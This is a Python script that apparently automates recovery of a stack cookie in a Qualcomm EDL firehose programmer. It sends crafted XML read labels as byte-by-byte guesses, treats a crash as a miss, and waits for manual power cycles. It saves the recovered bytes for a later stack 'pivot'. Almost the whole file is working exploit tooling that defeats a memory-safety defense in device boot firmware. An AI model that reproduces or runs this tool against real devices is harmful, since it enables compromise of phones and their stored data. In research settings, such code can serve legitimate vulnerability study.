#!/usr/bin/env python3
"""oracle_loop.py — unattended cookie oracle across power cycles.

Downloads of the cookie byte by byte. A wrong guess parks the programmer in the
non-returning spin loop 0x149a006c, so every miss needs a physical power cycle.
This tool waits for that cycle on its own:

  wait for the 9008 port to disappear -> reappear -> upload -> send one probe
  -> alive?  byte solved, continue in the same session
     dead?   record, wait for the next power cycle

Progress lives in cookie.bin (one byte appended per hit) so it can be stopped
and restarted at any time. `--max-cycles` bounds the run.

Also usable as a *static-value test*: run it, note byte 0, power cycle, run
again — if the first guess that hits is the same value both times the cookie is
static on this device (then one recovery lasts forever).

Usage:
  python oracle_loop.py --port COM6 --max-cycles 40
  python oracle_loop.py --port COM6 --force-byte 0 --value 0x7e
  (omit --port to auto-detect the first USB PID 9008 device)
"""
from __future__ import annotations

import argparse
import os
import subprocess
import sys
import time

import serial
import serial.tools.list_ports

import exec_label as E
import fhcore
from fhcore import log

TAG = "oracle"


def port_present(pid=0x9008):
    return any(p.pid == pid for p in serial.tools.list_ports.comports())


def wait_absent(timeout=180):
    t0 = time.time()
    while time.time() - t0 < timeout:
        if not port_present():
            log("device gone — waiting for the power cycle")
            return True
        time.sleep(0.5)
    log("device never left the bus (%.0fs)" % timeout)
    return False


def sahara_alive(portname, hello_timeout=1.5):
    """True when the target answers a Sahara HELLO — i.e. a fresh PBL, not a
    parked firehose. A parked programmer accepts bytes but never replies."""
    import struct
    try:
        p = serial.Serial(portname, timeout=hello_timeout, write_timeout=2)
    except Exception:
        return False
    try:
        p.setDTR(True)
        time.sleep(0.15)
        p.read(0x4000)
        # Sahara HELLO: cmd=1, len=0x30, ver=2, ver_min=1, max_len=0x1000, mode=0, 6 reserved
        p.write(struct.pack('<12I', 0x01, 0x30, 0x02, 0x01, 0x1000, 0x00, 0, 0, 0, 0, 0, 0))
        r = p.read(0x40)
        if not r:
            return False
        cmd = struct.unpack_from('<I', r, 0)[0]
        # 0x02 = HELLO_RESP; 0x04 = READ_DATA (already past hello in this probe).
        # A parked firehose answers neither.
        return cmd in (0x02, 0x04, 0x05, 0x06, 0x0D)
    except Exception:
        return False
    finally:
        p.close()


def wait_pbl(timeout=900, step=2.0):
    """Wait until the target answers Sahara (fresh PBL) or a firehose session
    that is no longer parked answers XML."""
    t0 = time.time()
    while time.time() - t0 < timeout:
        port = next((p.device for p in serial.tools.list_ports.comports()
                     if p.pid == 0x9008), None)
        if port and sahara_alive(port):
            log("target answers Sahara — fresh PBL")
            return True
        time.sleep(step)
    log("no Sahara response after %.0fs" % timeout)
    return False


def wait_present(timeout=240):
    t0 = time.time()
    while time.time() - t0 < timeout:
        if port_present():
            time.sleep(0.8)                    # let the descriptor settle
            return True
        time.sleep(0.5)
    log("no 9008 after %.0fs" % timeout)
    return False


def load_cookie() -> bytearray:
    if os.path.exists(E.COOKIE_FILE):
        return bytearray(open(E.COOKIE_FILE, "rb").read())
    return bytearray()


def save(known: bytearray):
    open(E.COOKIE_FILE, "wb").write(bytes(known))


def open_fresh(images: str, tries: int = 3):
    """A power cycle is assumed to have happened: the device is a fresh PBL.

    If it is not (upload still fails), the old programmer is probably still
    holding the port, so fall back to attaching and let the caller's probe
    decide whether the session is usable.
    """
    err = None
    for attempt in range(tries):
        if attempt == 0:
            fhcore.kill_stale_tools()
            time.sleep(0.5)
        port = next((p.device for p in serial.tools.list_ports.comports()
                     if p.pid == 0x9008), None)
        if not port:
            if attempt == tries - 1:
                raise RuntimeError("no 9008 port")
            time.sleep(1.5)
            continue
        cfg = fhcore.LiveConfig(port=port, image_dir=images)
        try:
            return fhcore.open_live_session(cfg, send_digest=True, mode_type=5)
        except Exception as e:              # Sahara refused
            err = e
            log("upload attempt failed (%s), retrying" % type(e).__name__)
            time.sleep(2.0)
    raise err


XML_BAD = {0x22: '"', 0x26: '&', 0x3C: '<', 0x3E: '>'}


def try_guess(session, known: bytearray, guess: int) -> bool:
    label = E.oracle_label(bytes(known), guess)
    try:
        session.send(E.read_xml(label), 1.2)
    except Exception:
        return False
    time.sleep(0.15)
    up, _ = E.alive(session)
    return up


def cycle_note(guess=None, index=None, left=None):
    log("")
    log("=" * 62)
    if guess is not None:
        log("  RESTART NOW  ->  next try: byte %d = %#04x   (%d left)"
            % (index, guess, left))
    else:
        log("  RESTART NOW  ->  waiting for the next round")
    log("  (power + both volume keys; the tool waits for Sahara)")
    log("=" * 62)
    log("")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", default=None,
                    help="EDL COM port (default: auto-detect PID 9008)")
    ap.add_argument("--images", default=E.DEFAULT_IMAGES)
    ap.add_argument("--max-cycles", type=int, default=60)
    ap.add_argument("--start-guess", default="1")
    ap.add_argument("--force-byte", type=int, default=None,
                    help="probe this byte index only")
    ap.add_argument("--value", default=None, help="try one explicit guess first")
    ap.add_argument("--no-wait", action="store_true",
                    help="device is already at PBL, do not wait for a cycle")
    args = ap.parse_args()

    known = load_cookie()
    log("cookie so far: %s (%d/8)" % (bytes(known).hex() or "-", len(known)))
    if len(known) == 8:
        log("complete: %s" % bytes(known).hex())
        return
    if 0 in known:
        log("a NUL is already in the recovered prefix — pivot impossible")
        return
    for i, b in enumerate(known):
        if b in XML_BAD:
            log("byte %d is %#04x (%r) — raw inside the attribute, XML breaks"
                % (i, b, XML_BAD[b]))

    index = args.force_byte if args.force_byte is not None else len(known)
    if index != len(known):
        log("note: forcing byte %d while %d bytes are stored" % (index, len(known)))

    guesses = list(range(int(args.start_guess, 0), 256))
    if args.value is not None:
        v = int(args.value, 0)
        guesses = [v] + [g for g in guesses if g != v]

    cycles = 0
    session = None
    try:
        if not args.no_wait:
            cycle_note()
            if not wait_pbl():
                return 1
        session, port = open_fresh(args.images)

        while guesses:
            if len(known) >= 8:
                log("*** complete: %s" % bytes(known).hex())
                break
            guess = guesses[0]
            log("byte %d -> guess %#04x (%d left)" % (index, guess, len(guesses) - 1))
            if guess in XML_BAD:
                log("    %#04x is %r — raw write breaks the attribute; a hit here"
                    % (guess, XML_BAD[guess]))
            ok = try_guess(session, known, guess)
            if ok:
                log("    HIT  byte %d = %#04x" % (index, guess))
                if index == len(known):
                    known.append(guess)
                else:
                    known[index] = guess
                save(known)
                guesses.pop(0)
                if index == len(known) - 1:
                    index = len(known)
                    guesses = list(range(1, 256))
                continue

            log("    miss -> parked; byte %d still open" % index)
            session.close()
            session = None
            cycles += 1
            if cycles >= args.max_cycles:
                log("cycle budget exhausted (%d); progress saved" % cycles)
                return 0
            nxt = guesses[1] if len(guesses) > 1 else None
            cycle_note(nxt, index, len(guesses) - 1)
            if not wait_pbl():
                return 1
            session, port = open_fresh(args.images)
            guesses.pop(0)
        else:
            log("all 255 non-zero guesses missed byte %d -> the byte is 0x00." % index)
            log("A NUL cannot be carried by a label at all.")
            return 2
    finally:
        if session:
            session.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
